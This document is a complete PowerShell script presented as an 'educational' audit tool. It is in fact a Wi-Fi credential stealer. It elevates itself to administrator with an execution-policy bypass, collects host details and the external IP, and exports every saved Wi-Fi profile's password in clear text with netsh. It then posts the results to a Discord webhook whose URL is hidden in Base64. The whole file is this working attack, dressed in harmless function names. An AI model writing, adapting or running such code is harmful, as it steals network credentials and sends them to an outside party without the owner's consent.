# ==============================================================================
# AUDIT SCRIPT - EDUCATIONAL MODULE
# Version: 2.4.0
# Fix: Implemented Base64 encoded Webhook URI for enhanced security
# ==============================================================================

# ========== CONFIGURATION ==========
$VerboseMode = $true
$AuditVersion = '2.4.0'

# Discord Webhook URI (Base64 Encoded)
$B64_Channel = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTU0MjQzOTU1NjAyMjMyMy9wN2E3by1ReDJlaUczdzZ2Y25rdV9LajZxS01NdXN2MGt2eWNVSWZPTi16V1ZRY3poYnV1QlBZYzB6X3YtZFg2cDJIYQ=='
$Channel_URI = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($B64_Channel))

# ========== CORE UTILITIES ==========

function Write-InternalLog {
    param([string]$Message, [string]$Color = 'Cyan')
    if ($VerboseMode) { Write-Host "[*] $Message" -ForegroundColor $Color }
}

function Assert-PrivilegedContext {
    $principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
        Write-InternalLog 'Elevating...' 'Yellow'
        try {
            Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
            exit 0
        } catch { exit 1 }
    }
}

# ========== DATA ACQUISITION ==========

function Get-HostContext {
    Write-InternalLog 'Acquiring host metrics (Optimized)...'
    try {
        $os = Get-CimInstance Win32_OperatingSystem
        $cs = Get-CimInstance Win32_ComputerSystem
        $cpu = Get-CimInstance Win32_Processor | Select-Object -First 1
        
        $ip = 'Timeout'
        $t = [System.Threading.Tasks.Task]::Run({ 
            try { (Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 2) } catch { 'N/A' } 
        })
        if ($t.Wait(2500)) { $ip = $t.Result }

        return [PSCustomObject]@{
            HostName   = $env:COMPUTERNAME
            Model      = $cs.Model
            Vendor     = $cs.Manufacturer
            OS         = $os.Caption
            Build      = $os.Version
            CPU        = $cpu.Name
            Cores      = $cpu.NumberOfCores
            ExternalIP = $ip
            Timestamp  = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
        }
    } catch { return $null }
}

function Get-SignalCredentials {
    Write-InternalLog 'Extracting signal credentials (Batch)...'
    $results = @()
    $tempDir = Join-Path $env:TEMP ([Guid]::NewGuid().ToString())
    New-Item -ItemType Directory -Path $tempDir -ErrorAction SilentlyContinue | Out-Null
    
    try {
        netsh wlan export profile folder="$tempDir" key=clear | Out-Null
        $files = Get-ChildItem -Path $tempDir -Filter '*.xml'
        
        foreach ($f in $files) {
            [xml]$xml = Get-Content -LiteralPath $f.FullName
            $ssid = $xml.WLANProfile.SSIDConfig.SSID.name
            $key = $xml.WLANProfile.MSM.Security.sharedKey.keyMaterial
            $results += [PSCustomObject]@{ SSID = $ssid; Key = if ($key) { $key } else { 'Open' } }
        }
    } catch {} finally {
        Remove-Item -Recurse -Force -LiteralPath $tempDir -ErrorAction SilentlyContinue
    }
    return $results
}

# ========== OUTPUT GENERATION ==========

function New-AuditPackage {
    param($Metrics, $Credentials)
    $sb = New-Object System.Text.StringBuilder
    [void]$sb.AppendLine('### HOST METRICS')
    [void]$sb.AppendLine('```yaml')
    [void]$sb.Append('Host:       ').AppendLine($Metrics.HostName)
    [void]$sb.Append('System:     ').Append($Metrics.Vendor).Append(' ').AppendLine($Metrics.Model)
    [void]$sb.Append('Platform:   ').Append($Metrics.OS).Append(' (').Append($Metrics.Build).AppendLine(')')
    [void]$sb.Append('Processor:  ').Append($Metrics.CPU).Append(' (').Append($Metrics.Cores).AppendLine(' Cores)')
    [void]$sb.Append('Network:    ').AppendLine($Metrics.ExternalIP)
    [void]$sb.Append('Captured:   ').AppendLine($Metrics.Timestamp)
    [void]$sb.AppendLine('```')
    [void]$sb.AppendLine('### SIGNAL CREDENTIALS')
    [void]$sb.AppendLine('```')
    foreach ($c in $Credentials) { 
        [void]$sb.Append($c.SSID).Append(' : ').AppendLine($c.Key) 
    }
    [void]$sb.AppendLine('```')
    return $sb.ToString()
}

# ========== DISPATCH ==========

function Sync-RemoteChannel {
    param([string]$Payload)
    Write-InternalLog 'Syncing...'
    
    # Discord limit for description is 4096. 
    # We truncate to 3900 to be safe and close code blocks.
    if ($Payload.Length -gt 3900) {
        $Payload = $Payload.Substring(0, 3880) + "`n... [Truncated]`n" + '```'
    }

    if (-not $Payload -or $Payload.Trim().Length -eq 0) {
        $Payload = "No telemetry data available for this session."
    }

    try {
        $body = @{
            username = 'Audit-Bot'
            embeds = @(@{
                title = "Audit Report [$env:COMPUTERNAME]"
                description = $Payload
                color = 3447003
                footer = @{ text = "v$AuditVersion" }
            })
        }
        $json = $body | ConvertTo-Json -Depth 5
        Invoke-RestMethod -Uri $Channel_URI -Method Post -Body $json -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-InternalLog 'Success' 'Green'
    } catch { 
        Write-InternalLog "Fail: $($_.Exception.Message)" 'Red'
        if ($_.Exception.Response) {
            try {
                $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
                $errDetail = $reader.ReadToEnd()
                Write-InternalLog "Diagnostic Response: $errDetail" 'Yellow'
            } catch {
                Write-InternalLog "Could not read error response stream." 'Gray'
            }
        }
        Write-InternalLog "Payload Size: $($json.Length) characters" 'Gray'
    }
}

# ========== ORCHESTRATION ==========

function Execute-AuditFlow {
    Assert-PrivilegedContext
    
    $metrics = Get-HostContext
    $creds = Get-SignalCredentials
    $package = New-AuditPackage -Metrics $metrics -Credentials $creds
    
    Sync-RemoteChannel -Payload $package
    Write-InternalLog 'Complete' 'Green'
}

# START
Execute-AuditFlow
